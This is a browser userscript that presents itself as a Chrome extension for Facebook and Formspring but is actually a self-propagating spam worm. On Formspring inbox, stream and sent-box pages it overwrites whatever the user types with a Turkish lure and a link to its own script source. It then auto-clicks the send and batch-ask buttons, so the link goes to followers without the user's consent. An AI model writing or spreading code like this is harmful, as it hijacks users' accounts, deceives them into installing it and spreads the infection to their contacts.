// ==UserScript==
// @name           Chrome Formspring
// @author         Chrome Formspring
// @version        1.0
// @description    Facebook için hazırlanmış Google Chrome eklentisi
// @namespace      Chrome Formspring
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://*.formspring.me/*
// ==/UserScript==


if(document.URL.indexOf("account/inbox") >= 0){
	for(i=0;i<=document.getElementsByName("answer").length - 1;i++){
	document.getElementsByName("answer").item(i).setAttribute("onkeydown","this.value='http://userscripts.org/scripts/source/115111.user.js FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';this.previousSibling.parentNode.parentNode.getElementsByTagName('input').item(2).click();");
	}
	
}

if(document.URL.indexOf("follow/stream") >= 0){
document.getElementsByName('attach_link_field').item(0).value = 'http://userscripts.org/scripts/source/115111.user.js';
document.getElementsByName("question").item(0).value='FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';
document.getElementById('batch_ask').getElementsByTagName('input').item(3).click();
document.getElementsByName("question").item(0).setAttribute("onkeydown","document.getElementsByName('attach_link_field').item(0).value = 'http://userscripts.org/scripts/source/115111.user.js';this.value='FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';document.getElementById('batch_ask').getElementsByTagName('input').item(3).click();");
}

if(document.URL.indexOf("sent/box") >= 0){
document.getElementsByName('attach_link_field').item(0).value = 'http://userscripts.org/scripts/source/115111.user.js';
document.getElementsByName("question").item(0).value='FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';
document.getElementById('batch_ask').getElementsByTagName('input').item(3).click();
document.getElementsByName("question").item(0).setAttribute("onkeydown","document.getElementsByName('attach_link_field').item(0).value = 'http://userscripts.org/scripts/source/115111.user.js';this.value='FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';document.getElementById('batch_ask').getElementsByTagName('input').item(3).click();");
}

if(document.URL.indexOf("formspring.me")){
if(document.getElementsByName("question").length > 0 && document.URL.indexOf("sent/box") < 0){
document.getElementsByName("question").item(0).setAttribute("onkeydown","this.value='http://userscripts.org/scripts/source/115111.user.js FormSpring Eklentisi Çok Güzel Lan Deneyin :D Sadece Google Chrome da Çalışıyo ';document.getElementById('sendButton').click();");
}
}
